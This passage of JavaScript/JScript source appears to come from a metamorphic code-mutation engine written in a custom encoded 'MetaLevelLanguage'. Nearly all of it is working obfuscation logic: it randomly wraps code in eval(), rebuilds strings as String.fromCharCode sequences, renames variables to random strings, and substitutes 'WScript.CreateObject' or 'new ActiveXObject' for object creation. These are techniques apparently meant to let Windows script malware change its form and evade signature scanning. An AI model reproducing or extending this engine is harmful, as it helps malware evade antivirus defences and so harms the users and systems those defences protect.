        MetaLevelLanguage+='__(RVIA200|)y°+argRemoveVariableIndicator+°=#x1#O1°+argRemoveVariableIndicator+°#.substring(#n0n#,#x2#O2°+argRemoveVariableIndicator+°#.indexOf(#x3#x4fGiveMeString(#n95n#)+fGiveMeString(#n42n#)4x#+#x5fGiveMeString(#n95n#)+fGiveMeString(#n42n#)5x#3x#)2O#2x#)1O#+ #O3°+argRemoveVariableIndicator+°#.substring(#x6#O4°+argRemoveVariableIndicator+°#.indexOf(#x7#x8fGiveMeString(#n42n#)+fGiveMeString(#n95n#)8x#+#x9fGiveMeString(#n42n#)+fGiveMeString(#n95n#)9x#7x#)4O#+#n4n#6x#)3O#1x#';
    MetaLevelLanguage+='__(RVI0200|RVI0100)xreturn(#x1°+argRemoveVariableIndicator+°1x#)';



MetaLevelLanguage+='__(1400|)function fDeriveRestrictVC(argDeriveRestrictVC1,argDeriveRestrictVC2,argDeriveRestrictVC3)044';
    MetaLevelLanguage+='__(DRVC0100|)var DRWhichRnd=#x1fGiveRandomNumber(#x2°+argDeriveRestrictVC2+°2x#)1x#';
    MetaLevelLanguage+='__(DRVC0150|DRVC0100)if(#x1#O1°+argDeriveRestrictVC1+°#.toString().indexOf(#x2#"ev"#+#"al("#2x#)1O#1x#!#x3#n-1n#3x#?!=)001';
        MetaLevelLanguage+='__(DRVCA150|)c+n(°+DRWhichRnd+°,#x1#n7n#1x#)';
    MetaLevelLanguage+='__(DRVC0160|)000';
    MetaLevelLanguage+='__(DRVC0200|DRVC0150)if(#x1°+DRWhichRnd+°1x#!#x2#n10n#2x#?>)001';
        MetaLevelLanguage+='__(DRVCA100|)xreturn(#x1°+argDeriveRestrictVC1+°1x#)';
    MetaLevelLanguage+='__(DRVC0300|)000';
    MetaLevelLanguage+='__(DRVC0400|)var DRRndStr=#x1fGiveRandomString()1x#';
    MetaLevelLanguage+='__(DRVC0500|DRVC0200,DRVC0400)if(#x1°+DRWhichRnd+°1x#!#x2#n8n#2x#?>)017';
        MetaLevelLanguage+='__(DRVCZ100|)if(#x1°+argDeriveRestrictVC3+°1x#!#x2#n1n#2x#?!=)015';
            MetaLevelLanguage+='__(DRVCA100|)if(#x1fGiveRandomNumber(#x2#n2n#2x#)1x#!#x3#n0n#3x#?==)005';  
                MetaLevelLanguage+='__(DRVCAA050|)c+s(°+sDeriveRestrString+°,#x1#"var "#1x#)';            
                MetaLevelLanguage+='__(DRVCAA100|DRVCAA050)c+s(°+sDeriveRestrString+°,#x1°+DRRndStr+°1x#)';
                MetaLevelLanguage+='__(DRVCAA200|DRVCAA100)c+s(°+sDeriveRestrString+°,#x1#"="#1x#)';
                MetaLevelLanguage+='__(DRVCAA300|DRVCAA200)c+s(°+sDeriveRestrString+°,#x1°+argDeriveRestrictVC1+°1x#)';
                MetaLevelLanguage+='__(DRVCAA400|DRVCAA300)c+s(°+sDeriveRestrString+°,#x1#x2fGiveMeString(64)2x#+#x3fGiveMeString(59)3x#1x#)';
            MetaLevelLanguage+='__(DRVCA200|)007';
                MetaLevelLanguage+='__(DRVCAA100|)var DRVCtmp=#x1#"var "#1x#';
                MetaLevelLanguage+='__(DRVCAA200|DRVCAA100)c+s(°+DRVCtmp+°,#x1°+DRRndStr+°1x#)';
                MetaLevelLanguage+='__(DRVCAA300|DRVCAA200)c+s(°+DRVCtmp+°,#x1#"="#1x#)';
                MetaLevelLanguage+='__(DRVCAA400|DRVCAA300)c+s(°+DRVCtmp+°,#x1°+argDeriveRestrictVC1+°1x#)';
                MetaLevelLanguage+='__(DRVCAA500|DRVCAA400)c+s(°+DRVCtmp+°,#x1#x2fGiveMeString(#x5#n64n#5x#)2x#+#x3fGiveMeString(#x4#n59n#4x#)3x#1x#)';
                MetaLevelLanguage+='__(DRVCAA600|DRVCAA500)c+s(°+DRVCtmp+°,#x1°+sDeriveRestrString+°1x#)';
                MetaLevelLanguage+='__(DRVCAA700|DRVCAA600)y°+sDeriveRestrString+°=#x1°+DRVCtmp+°1x#';
            MetaLevelLanguage+='__(DRVCA300|DRVCA100)xreturn(#x1°+DRRndStr+°1x#)';
        MetaLevelLanguage+='__(DRVCZ200|)000';            
    MetaLevelLanguage+='__(DRVC0600|)000';
    MetaLevelLanguage+='__(DRVC0700|DRVC0500)if(#x1°+DRWhichRnd+°1x#!#x2#n6n#2x#?>)004';
        MetaLevelLanguage+='__(DRVCA100|)var DRVariableString=#x1fGetVariableList(#x2#O1°+argDeriveRestrictVC1+°#.toString()1O#2x#)1x#';
        MetaLevelLanguage+='__(DRVCA200|DRVCA100)y°+argDeriveRestrictVC1+°=#x1fRemoveVariableMask(#x2#O1°+argDeriveRestrictVC1+°#.toString()1O#2x#)1x#';
        MetaLevelLanguage+='__(DRVCA250|DRVCA100)y°+argDeriveRestrictVC1+°=#x1fRemoveVariableIndicator(#x2#O1°+argDeriveRestrictVC1+°#.toString()1O#2x#)1x#';         
        MetaLevelLanguage+='__(DRVCA300|DRVCA200,DRVCA250)xreturn(#x1#x2#"eval("#2x#+#x3fCreateString(°+argDeriveRestrictVC1+°)3x#+#x4#")"#4x#+ #x5°+DRVariableString+°5x#1x#)';
    MetaLevelLanguage+='__(DRVC0800|)000';
    MetaLevelLanguage+='__(DRVC0900|)var DRVariableListLL=[]';
    MetaLevelLanguage+='__(DRVC1000|)var DRVariableListRnd=[]';
    MetaLevelLanguage+='__(DRVC1100|DRVC0700,DRVC0900,DRVC1000)y°+argDeriveRestrictVC1+°=#x1fCreateVariableListForFunctionCalls(#x2°+argDeriveRestrictVC1+°2x#,#x3°+DRVariableListLL+°3x#,#x4°+DRVariableListRnd+°4x#)1x#';
    MetaLevelLanguage+='__(DRVC1200|DRVC0700)y°+sFunctionNames+°.push(#x1°+DRRndStr+°1x#)';
    MetaLevelLanguage+='__(DRVC1300|DRVC1100)y°+sFunctionArgs+°.push(#x1#x2#"("#2x#+ #x3°+DRVariableListRnd+°.join()3x#+#x4#")"#4x#1x#)';
    MetaLevelLanguage+='__(DRVC1400|DRVC1100)y°+sFunctionDefs+°.push(#x1#x2#"return "#2x#+#x3 °+argDeriveRestrictVC1+°3x#1x#)';
    MetaLevelLanguage+='__(DRVC1500|DRVC1100)var DRReturnValue=#x1#O1°+DRVariableListLL+°#.join(#x2#x3fGiveMeString(#x8#n43n#8x#)3x#+#x4fGiveMeString(#n176n#)4x#+#x5fGiveMeString(#n44n#)5x#+#x6fGiveMeString(#n176n#)6x#+#x7fGiveMeString(#x9#n43n#9x#)7x#2x#)1O#1x#';
    MetaLevelLanguage+='__(DRVC1600|DRVC1500)if(#x1#O1°+DRVariableListLL+°#.length1O#1x#!#x2#n0n#2x#?>)001';
        MetaLevelLanguage+='__(DRVCA100|)y°+DRReturnValue+°=#x1#x6fGiveMeString(#x2#n176n#2x#)6x#+#x7fGiveMeString(#x3#n43n#3x#)7x#+ #x8°+DRReturnValue+°8x# +#x9fGiveMeString(#x4#n43n#4x#)+fGiveMeString(#x5#n176n#5x#)9x#1x#';
    MetaLevelLanguage+='__(DRVC1700|)000';
    MetaLevelLanguage+='__(DRVC1800|DRVC1200,DRVC1300,DRVC1400,DRVC1500,DRVC1600)xreturn(#x1#x2°+DRRndStr+°2x# +#x3#"("#3x#+ #x4°+DRReturnValue+°4x# +#x5#")"#5x#1x#)';



MetaLevelLanguage+='__(1500|)function fCreateExecution(argCreateExecution1,argCreateExecution2)049';
    MetaLevelLanguage+='__(CE0100|)var CERnd1=#x1fGiveRandomNumber(#x2#n8n#2x#)1x#';
    MetaLevelLanguage+='__(CE0200|CE0100)if(#x1°+argCreateExecution2+°1x#!#x2#n1n#2x#?==)001';      
        MetaLevelLanguage+='__(CEA100|)y°+CERnd1+°=#x1fGiveRandomNumber(#x2#n5n#2x#)1x#'; 
    MetaLevelLanguage+='__(CE0300|)000';
    MetaLevelLanguage+='__(CE0400|CE0100)if(#x1°+CERnd1+°1x#!#x2#n4n#2x#?<)001';      
        MetaLevelLanguage+='__(CEA100|)xreturn(#x1°+argCreateExecution1+°1x#)'; 
    MetaLevelLanguage+='__(CE0500|)000';    
    MetaLevelLanguage+='__(CE0600|CE0200,CE0400)if(#x1°+CERnd1+°1x#!#x2#n6n#2x#?<)006';
        MetaLevelLanguage+='__(CEA100|)if(#x1#O1°+argCreateExecution1+°#.substring(#x2#n0n#2x#,#x3#n7n#3x#)1O#1x#!#x4#"return("#4x#?!=)004';  
            MetaLevelLanguage+='__(CEAA100|)var CEVariableString=#x1fGetVariableList(#x2°+argCreateExecution1+°2x#)1x#';
            MetaLevelLanguage+='__(CEAA200|CEAA100)y°+argCreateExecution1+°=#x1fRemoveVariableMask(#x2°+argCreateExecution1+°2x#)1x#';
            MetaLevelLanguage+='__(CEAA250|CEAA100)y°+argCreateExecution1+°=#x1fRemoveVariableIndicator(#x2°+argCreateExecution1+°2x#)1x#';                 
            MetaLevelLanguage+='__(CEAA300|CEAA200,CEAA250)xreturn(#x1#x2#"eval("#2x#+#x3fCreateString(#x6°+argCreateExecution1+°6x#)3x#+#x4#")"#4x#+ #x5°+CEVariableString+°5x#1x#)';      
        MetaLevelLanguage+='__(CEA200|)000';
    MetaLevelLanguage+='__(CE0700|)000';
    MetaLevelLanguage+='__(CE0750|CE0400,CE0600)if(#x1#O1°+argCreateExecution1+°#.indexOf(#x2#"eva"#+#"l("#2x#)1O#1x#!#x3#n-1n#3x#?!=)001';
        MetaLevelLanguage+='__(CEA100|)xreturn(#x1°+argCreateExecution1+°1x#)'; 
    MetaLevelLanguage+='__(CE0760|)000';              
    MetaLevelLanguage+='__(CE0800|)var CERnd2=#x1fGiveRandomString()1x#';
    MetaLevelLanguage+='__(CE0900|CE0750,CE0800)if(#x1°+sRecordFunctionVariables+°1x#!#x2#n0n#2x#?==)003';        
        MetaLevelLanguage+='__(CEA100|)y°+sRecordFunctionFN+°=#x1#O1°+sFunctionNames+°#.length1O#1x#';     
        MetaLevelLanguage+='__(CEA200|)y°+sRecordFunctionVN+°=#x1#O1°+sVarNames+°#.length1O#1x#';     
        MetaLevelLanguage+='__(CEA300|)y°+#O1sFunctionVariableFctName+°#.push(#x1°+CERnd2+°1x#)1O#';
    MetaLevelLanguage+='__(CE1000|)000';
    MetaLevelLanguage+='__(CE1100|CE0900)c+1(°+sRecordFunctionVariables+°)';
    MetaLevelLanguage+='__(CE1200|)var CEVariableList=#x1[]1x#';
    MetaLevelLanguage+='__(CE1300|)var CEVariableRndList=#x1[]1x#';
    MetaLevelLanguage+='__(CE1400|CE1100,CE1200,CE1300)y°+argCreateExecution1+°=#x1fCreateVariableListForFunctionCalls(#x2°+argCreateExecution1+°2x#,#x3°+CEVariableList+°3x#,#x4°+CEVariableRndList+°4x#)1x#';
    MetaLevelLanguage+='__(CE1500|CE1400)y#O1°+sFunctionDefs+°#.push(#x1fCreateExecution(#x2°+argCreateExecution1+°2x#)1x#)1O#';
    MetaLevelLanguage+='__(CE1600|CE1500)y#O1°+sFunctionNames+°#.push(#x1°+CERnd2+°1x#)1O#';
    MetaLevelLanguage+='__(CE1700|CE1500)y#O1°+sFunctionArgs+°#.push(#x1#x2#"("#2x#+ #x3#O2°+CEVariableRndList+°#.join()2O#3x#+#x4#")"#4x#1x#)1O#';
    MetaLevelLanguage+='__(CE1800|CE1600,CE1700)c-1(°+sRecordFunctionVariables+°)';
    MetaLevelLanguage+='__(CE1900|CE1800)if(#x1°+sRecordFunctionVariables+°1x#!#x2#n0n#2x#?==)003';
        MetaLevelLanguage+='__(CEA100|)def RecordFctNames=#x1#O1°+sFunctionNames+°#.slice(#x2°+sRecordFunctionFN+°2x#)1O#1x#';
        MetaLevelLanguage+='__(CEA200|)def RecordVNames1=#x1#O1°+sVarNames+°#.slice(#x2°+sRecordFunctionVN+°2x#)1O#1x#';
        MetaLevelLanguage+='__(CEA300|CEA100,CEA200)y#x1#O1°+sFunctionVariableNameArray+°#.push(#x2#O2°+RecordVNames1+°#.concat(#x3°+RecordFctNames+°3x#)2O#2x#)1O#1x#';
    MetaLevelLanguage+='__(CE2000|)000';
    MetaLevelLanguage+='__(CE2100|CE1900)var CEReturnValue1=#x1#O1°+CEVariableList+°#.join(#x2#x3fGiveMeString(#x8#n43n#8x#)3x#+#x4fGiveMeString(#n176n#)4x#2x#+#x5fGiveMeString(#x9#n44n#9x#)+#x6fGiveMeString(#n176n#)6x#+#x7fGiveMeString(#n43n#)7x#5x#)1O#1x#';
    MetaLevelLanguage+='__(CE2200|CE2100)if(#x1#O1°+CEVariableList+°#.length1O#1x#!#x2#n0n#2x#?>)005';           
        MetaLevelLanguage+='__(CEA100|CEA1B0)var SomeRndName=#x1#""#1x#';    
        MetaLevelLanguage+='__(CEA200|CEA100)c+s(°+SomeRndName+°,#x1#x2fGiveMeString(#x4#n176n#4x#)2x#+#x3fGiveMeString(#x5#n43n#5x#)3x#1x#)';
        MetaLevelLanguage+='__(CEA300|CEA200)c+s(°+SomeRndName+°,#x1°+CEReturnValue1+°1x#)';
        MetaLevelLanguage+='__(CEA400|CEA300)c+s(°+SomeRndName+°,#x1#x2fGiveMeString(#x4#n43n#4x#)2x#+#x3fGiveMeString(#x5#n176n#5x#)3x#1x#)';
        MetaLevelLanguage+='__(CEA500|CEA400)y°+CEReturnValue1+°=#x1°+SomeRndName+°1x#';    
    MetaLevelLanguage+='__(CE2300|)000';
    MetaLevelLanguage+='__(CE2400|CE2200)if(#x1#O1°+argCreateExecution1+°#.substring(#x2#n0n#2x#,#x3#n7n#3x#)1O#1x#!#x4#"return("#4x#?==)001';
        MetaLevelLanguage+='__(CEA100|)xreturn(#x1#x2#"return("#2x#+ #x3°+CERnd2+°3x# +#x4#"("#4x#+#x5 °+CEReturnValue1+° 5x#+#x6#"))"#6x#1x#)';
    MetaLevelLanguage+='__(CE2500|)000';
    MetaLevelLanguage+='__(CE2600|CE2400)xreturn(#x1#x2°+CERnd2+° 2x#+#x3#"("#3x#+#x4 °+CEReturnValue1+° 4x#+#x5#")"#5x#1x#)';



MetaLevelLanguage+='__(1600|)function fCreateString(argCreateString1)045'; 
    MetaLevelLanguage+='__(CS0100|)var CSInString=#x1°+argCreateString1+°1x#';
    MetaLevelLanguage+='__(CS0200|CS0100)var CSRNum1=#x1#O1Math#.floor(#x2#x3#O2Math#.random()2O#3x#*#x4#O3°+CSInString+°#.length3O#/#x5#n6n#5x#4x#2x#)1O#1x#';
    MetaLevelLanguage+='__(CS0250|CS0200)if(°+CSRNum1+°!1000?>)001';
        MetaLevelLanguage+='__(CS0200|CS0100)y°+CSRNum1+°=#x1#O1Math#.floor(#x2#x3#O2Math#.random()2O#3x#*#x4#O3°+CSInString+°#.length3O#/#x5#n50n#5x#4x#2x#)1O#1x#'; 
    MetaLevelLanguage+='__(CS0251|)000';
    MetaLevelLanguage+='__(CS0300|CS0250)while(var CSCount1=#x1#n0n#1x#$#x2°+CSCount1+°2x#!#x3°+CSRNum1+°3x#?<@°+CSCount1+°=#x4#x5°+CSCount1+°5x#+#x6#n1n#6x#4x#)002';
        MetaLevelLanguage+='__(CSA100|)var CSRNum2=#x1fGiveRandomNumber(#x2#O2°+CSInString+°#.length2O#2x#)1x#';
        MetaLevelLanguage+='__(CSA200|CSA100)yCSInString=#x1#x2#O1°+CSInString+°#.substring(#n0n#,#x9°+CSRNum2+°9x#)1O#2x#+#x3fGiveMeString(#x4#n64n#4x#)3x#+#x8fGiveMeString(#x5#n64n#5x#)8x#+#x6 #O2°+CSInString+°#.substring(#x7°+CSRNum2+°7x#)2O#6x#1x#';
    MetaLevelLanguage+='__(CS0400|CS0300)var CSSplitStr=#x1#O1°+CSInString+°#.split(#x3#x4fGiveMeString(#x5#n64n#5x#)4x#+#x2fGiveMeString(#x6#n64n#6x#)2x#3x#)1O#1x#';          
    MetaLevelLanguage+='__(CS0500|)var CSRVString=#x1#""#1x#';  
    MetaLevelLanguage+='__(CS0600|CS0400,CS0500)while(var CSCount2=#x1#n0n#1x#$#x2°+CSCount2+°2x#!#x3#O1°+CSSplitStr+°#.length1O#3x#?<@°+CSCount2+°=#x4#x5°+CSCount2+°5x#+#x6#n1n#6x#4x#)033';
        MetaLevelLanguage+='__(CSA100|)var CSRNum3=#x1fGiveRandomNumber(#x2#n37n#2x#)1x#'; 
        MetaLevelLanguage+='__(CSA150|CSA100)if(#x1DoIWriteMetaCode1x#!#n1n#?==)001';
            MetaLevelLanguage+='__(CSB150|)c+n(°+CSRNum3+°,#x1#n14n#1x#)';       
        MetaLevelLanguage+='__(CSA151|)000';                        
        MetaLevelLanguage+='__(CSA200|CSA150,CSA100)if(#x1°+CSRNum3+°1x#!#x2#n14n#2x#?<)008';     
            MetaLevelLanguage+='__(CSAA100|)while($#x1#O1°+CSSplitStr+°[#x2°+CSCount2+°2x#]#.indexOf(#x3fGiveMeString(#x4#n39n#4x#)3x#)1O#1x#!#x5#n-1n#5x#?!=@)001';
                MetaLevelLanguage+='__(CSAAA100|)y°+CSSplitStr+°[#x1°+CSCount2+°1x#]=#x3#O1°+CSSplitStr+°[#x2°+CSCount2+°2x#]#.replace(#x4fGiveMeString(#n39n#)4x#,#x5fGiveMeString(#n35n#)+fGiveMeString(#n35n#)+fGiveMeString(#n35n#)+#x6#"+String.fromCharCode(39)+"#6x#+#x7fGiveMeString(#n35n#)+fGiveMeString(#n35n#)+fGiveMeString(#n35n#)7x#5x#)1O#3x#';
            MetaLevelLanguage+='__(CSAA200|CSAA100)while($#x1#O1°+CSSplitStr+°[#x2°+CSCount2+°2x#]#.indexOf(#x3fGiveMeString(#x4#n35n#4x#)+fGiveMeString(#n35n#)+fGiveMeString(#n35n#)3x#)1O#1x#!#n-1n#?!=@)001';
                MetaLevelLanguage+='__(CSAAA100|)y°+CSSplitStr+°[#x1°+CSCount2+°1x#]=#x2#O1°+CSSplitStr+°[#x3°+CSCount2+°3x#]#.replace(#x4fGiveMeString(#x6#n35n#6x#)+fGiveMeString(#n35n#)+fGiveMeString(#n35n#)4x#,#x5fGiveMeString(#x7#n39n#7x#)5x#)1O#2x#';
            MetaLevelLanguage+='__(CSAA300|CSAA200)c+s(°+CSRVString+°,#x1fGiveMeString(#x2#n39n#2x#)1x#)';
            MetaLevelLanguage+='__(CSAA400|CSAA300)c+s(°+CSRVString+°,#x1°+CSSplitStr+°[#x2°+CSCount2+°2x#]1x#)';
            MetaLevelLanguage+='__(CSAA500|CSAA400)c+s(°+CSRVString+°,#x1fGiveMeString(#x2#n39n#2x#)1x#)';
            MetaLevelLanguage+='__(CSAA600|CSAA500)c+s(°+CSRVString+°,#x1fGiveMeString(#x2#n43n#2x#)1x#)';
        MetaLevelLanguage+='__(CSA300|)000';
        MetaLevelLanguage+='__(CSA400|CSA150,CSA100)if(#x1°+CSRNum3+°1x#!#x2#n13n#2x#?>)007';
            MetaLevelLanguage+='__(CSAA100|)if(#x1°+CSRNum3+°1x#!#x2#n19n#2x#?<)005';
                MetaLevelLanguage+='__(CSAAA100|)var CSRName1=#x1fGiveRandomString()1x#';
                MetaLevelLanguage+='__(CSAAA200|)y#O1°+sVarDefs+°#.push(#x1fCreateString(#x2°+CSSplitStr+°[#x3°+CSCount2+°3x#]2x#)1x#)1O#';
                MetaLevelLanguage+='__(CSAAA300|CSAAA100,CSAAA200)y#O1°+sVarNames+°#.push(#x1°+CSRName1+°1x#)1O#';
                MetaLevelLanguage+='__(CSAAA400|CSAAA300)c+s(°+CSRVString+°,#x1fDeriveVC(#x2°+CSRName1+°2x#,#x3#n50n#3x#)1x#)';
                MetaLevelLanguage+='__(CSAAA500|CSAAA400)c+s(°+CSRVString+°,#x1fGiveMeString(#x2#n43n#2x#)1x#)';                                                                            
            MetaLevelLanguage+='__(CSAA200|)000';
        MetaLevelLanguage+='__(CSA500|)000';
        MetaLevelLanguage+='__(CSA600|CSA150,CSA100)if(#x1°+CSRNum3+°1x#!#x2#n18n#2x#?>)008';  
            MetaLevelLanguage+='__(CSAA100|)var CSTmpCharCode=#x1#""#1x#';
            MetaLevelLanguage+='__(CSAA200|CSAA100)while(var CSCount3=#x1#n0n#1x#$#x2°+CSCount3+°2x#!#x3#O1°+CSSplitStr+°[#x4°+CSCount2+°4x#]#.length1O#3x#?<@°+CSCount3+°=#x5#x6°+CSCount3+° 6x#+#x7#n1n#7x#5x#)002';
                MetaLevelLanguage+='__(CSAA100|)c+s(°+CSTmpCharCode+°,#x1fCreateNumeric(#x2#O1°+CSSplitStr+°[#x3°+CSCount2+°3x#]#.charCodeAt(#x4°+CSCount3+°4x#)1O#2x#)1x#)';
                MetaLevelLanguage+='__(CSAA200|CSAA100)c+s(°+CSTmpCharCode+°,#x1fGiveMeString(#x2#n44n#2x#)1x#)';      
            MetaLevelLanguage+='__(CSAA300|CSAA200)y°+CSTmpCharCode+°=#x1#O1°+CSTmpCharCode+°#.substr(#x2#n0n#2x#,#x3#O2°+CSTmpCharCode+°#.length2O#-#x4#n1n#4x#3x#)1O#1x#';    
            MetaLevelLanguage+='__(CSAA400|CSAA300)c+s(°+CSRVString+°,#x1#"String.fromCharCode("#1x#)';
            MetaLevelLanguage+='__(CSAA500|CSAA400)c+s(°+CSRVString+°,#x1°+CSTmpCharCode+°1x#)';
            MetaLevelLanguage+='__(CSAA600|CSAA500)c+s(°+CSRVString+°,#x1#")+"#1x#)';                                                    
        MetaLevelLanguage+='__(CSA700|)000';  
    MetaLevelLanguage+='__(CS0700|CS0600)xreturn(#x1#O1°+CSRVString+°#.substring(#x2#n0n#2x#,#x5#x3#O2°+CSRVString+°#.length2O#3x#-#x4#n1n#4x#5x#)1O#1x#)';
    
    
    
//MetaLevelLanguage+='__(1700|)function fPreCompilation()084';          // this is no function in the engine code
    
    // FullArray defintion
    MetaLevelLanguage+='__(PC0100|)def FullArray=#x1[]1x#';
    MetaLevelLanguage+='__(PC0200|PC0100)while(var FillA=#x1#n0n#1x#$#x2°+FillA+°2x#!#x3#n256n#3x#?<@°+FillA+°=#x4#x5°+FillA+°5x# +#x6#n1n#6x#4x#)001';
        MetaLevelLanguage+='__(PCA100|)xFullArray.push([#x1°+FillA+°1x#])';
        
        
    // $CreateObject$ alternatives  
    MetaLevelLanguage+='__(PC0300|orgv)while($#x1#O1sMetaLevelLanguage#.indexOf(#x2#x3fGiveMeString(#x6#n36n#6x#)3x#+#x4#"CreateObject"#4x#+#x5fGiveMeString(#x7#n36n#7x#)5x#2x#)1O#1x#!#x1#n-1n#1x#?!=@)004';
        MetaLevelLanguage+='__(PCA100|)if(#x1fGiveRandomNumber(#x2#n2n#2x#)1x#!0?==)001';
            MetaLevelLanguage+='__(PCA100|)ysMetaLevelLanguage=#x1#O1sMetaLevelLanguage#.replace(#x2#x3fGiveMeString(#n36n#)3x#+#x4#"CreateObject"#4x#+#x5fGiveMeString(#n36n#)5x#2x#,#x6#x7#"WScript"#7x#+#x8fGiveMeString(#n35n#)8x#+#x9#".CreateObject"#9x#6x#)1O#1x#';
        MetaLevelLanguage+='__(PCA200|PCA100)001';
            MetaLevelLanguage+='__(PCB100|)ysMetaLevelLanguage=#x1#O1sMetaLevelLanguage#.replace(#x2#x3fGiveMeString(#x7#n36n#7x#)3x#+#x4#"CreateObject"#4x#+#x5fGiveMeString(#x8#n36n#8x#)5x#2x#,#x6#"new ActiveXObject"#6x#)1O#1x#';
            
    // Define random variable names                                                
    MetaLevelLanguage+='__(PC0400|orgv,PC0200,PC0300)var CopyMetaLevelLanguage1=#x1sMetaLevelLanguage1x#';    
    MetaLevelLanguage+='__(PC0500|PC0400)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.replace(#x2#x3fGiveMeString(#n41n#)3x#+#x4fGiveMeString(#n118n#)4x#+#x5fGiveMeString(#n97n#)5x#+#x6fGiveMeString(#n114n#)6x#2x#,#x7#x8fGiveMeString(#n41n#)+fGiveMeString(#n100n#)8x#+#x9fGiveMeString(#n101n#)+fGiveMeString(#n102n#)9x#7x#)1O#1x#';
    MetaLevelLanguage+='__(PC0600|PC0400)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.replace(#x2#x4fGiveMeString(#n41n#)+fGiveMeString(#n119n#)+fGiveMeString(#n104n#)4x#+#x5fGiveMeString(#n105n#)+fGiveMeString(#n108n#)+fGiveMeString(#n101n#)+fGiveMeString(#n40n#)5x#+#x6fGiveMeString(#n118n#)+fGiveMeString(#n97n#)+fGiveMeString(#n114n#)6x#2x#,#x3#x7fGiveMeString(#n41n#)+fGiveMeString(#n119n#)+fGiveMeString(#n104n#)7x#+#x8fGiveMeString(#n105n#)+fGiveMeString(#n108n#)8x#+#x9fGiveMeString(#n101n#)+fGiveMeString(#n40n#)9x#3x#)1O#1x#';   // also consider while(var VariableName=...)     
    MetaLevelLanguage+='__(PC0700|PC0400,PC0600)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.replace(#x2#x6fGiveMeString(#n41n#)+#x9fGiveMeString(#n119n#)+fGiveMeString(#n104n#)9x#6x#+#x7fGiveMeString(#n105n#)+#x8fGiveMeString(#n108n#)+fGiveMeString(#n101n#)8x#+fGiveMeString(#n40n#)7x#2x#,#x3#x4fGiveMeString(#n41n#)+fGiveMeString(#n100n#)4x#+#x5fGiveMeString(#n101n#)+fGiveMeString(#n102n#)5x#3x#)1O#1x#';     
    MetaLevelLanguage+='__(PC0800|PC0500,PC0600,PC0700)while($#x1#O1°+CopyMetaLevelLanguage1+°#.indexOf(#x2#x3fGiveMeString(#n41n#)3x#+#x4fGiveMeString(#n100n#)4x#+#x5fGiveMeString(#n101n#)5x#+#x6fGiveMeString(#n102n#)6x#+#x7fGiveMeString(#n32n#)7x#2x#)1O#1x#!#x8#n-1n#8x#?!=@)008';
        MetaLevelLanguage+='__(PCA100|)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.substring(#x2#x4#O2°+CopyMetaLevelLanguage1+°#.indexOf(#x5#x6fGiveMeString(#n41n#)+fGiveMeString(#n100n#)6x#+#x7fGiveMeString(#n101n#)+fGiveMeString(#n102n#)+fGiveMeString(#n32n#)7x#5x#)2O#4x#+#x3#n1n#3x#2x#)1O#1x#';
        MetaLevelLanguage+='__(PCA200|PCA100)var VariableNameGlobal=#x1#O1°+CopyMetaLevelLanguage1+°#.substring(#x2#n4n#2x#,#x3#O2°+CopyMetaLevelLanguage1+°#.indexOf(#x4#"="#4x#)2O#3x#)1O#1x#';
        MetaLevelLanguage+='__(PCA300|)var PCRandomVariableName=#x1fGiveRandomString()1x#';
        MetaLevelLanguage+='__(PCA400|PCA200,PCA300)while($#x1#O1sMetaLevelLanguage#.indexOf(#x2°+VariableNameGlobal+°2x#)1O#1x#!#x3#n-1n#3x#?!=@)001';
            MetaLevelLanguage+='__(PCAA100|)ysMetaLevelLanguage=#x1#O1sMetaLevelLanguage#.replace(#x2°+VariableNameGlobal+°2x#,#x3°+PCRandomVariableName+°3x#)1O#1x#';
        MetaLevelLanguage+='__(PCA500|PCA400)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.replace(#x2#x4fGiveMeString(#n41n#)4x#+#x5fGiveMeString(#n118n#)5x#+#x6fGiveMeString(#n97n#)+fGiveMeString(#n114n#)6x#2x#,#x3#x7fGiveMeString(#n41n#)+fGiveMeString(#n100n#)7x#+#x8fGiveMeString(#n101n#)+fGiveMeString(#n102n#)8x#3x#)1O#1x#'
        MetaLevelLanguage+='__(PCA600|PCA400)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.replace(#x2#x4fGiveMeString(#n41n#)+fGiveMeString(#n119n#)+fGiveMeString(#n104n#)+fGiveMeString(#n105n#)4x#+#x5fGiveMeString(#n108n#)+fGiveMeString(#n101n#)+fGiveMeString(#n40n#)+fGiveMeString(#n118n#)+fGiveMeString(#n97n#)+fGiveMeString(#n114n#)5x#2x#,#x3#x6fGiveMeString(#n41n#)+fGiveMeString(#n119n#)+fGiveMeString(#n104n#)+fGiveMeString(#n105n#)6x#+#x7fGiveMeString(#n108n#)+fGiveMeString(#n101n#)+fGiveMeString(#n40n#)7x#3x#)1O#1x#'; 
        MetaLevelLanguage+='__(PCA700|PCA400,PCA600)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.replace(#x2#x6fGiveMeString(#n41n#)+fGiveMeString(#n119n#)+fGiveMeString(#n104n#)+fGiveMeString(#n105n#)6x#+#x7fGiveMeString(#n108n#)+fGiveMeString(#n101n#)+fGiveMeString(#n40n#)7x#2x#,#x3#x4fGiveMeString(#n41n#)+fGiveMeString(#n100n#)4x#+#x5fGiveMeString(#n101n#)+fGiveMeString(#n102n#)5x#3x#)1O#1x#';   
    MetaLevelLanguage+='__(PC0900|orgv)var CopyMetaLevelLanguage2=#x1sMetaLevelLanguage1x#';
    MetaLevelLanguage+='__(PC1000|PC0900)while($#x1#O1°+CopyMetaLevelLanguage2+°#.indexOf(#x2#x3#x7fGiveMeString(#n41n#)+fGiveMeString(#n102n#)7x#+#x6fGiveMeString(#n117n#)+fGiveMeString(#n110n#)+fGiveMeString(#n99n#)6x#3x#+#x4fGiveMeString(#n116n#)+#x5fGiveMeString(#n105n#)+fGiveMeString(#n111n#)+fGiveMeString(#n110n#)5x#+fGiveMeString(#n32n#)4x#2x#)1O#1x#!#n-1n#?!=@)014';
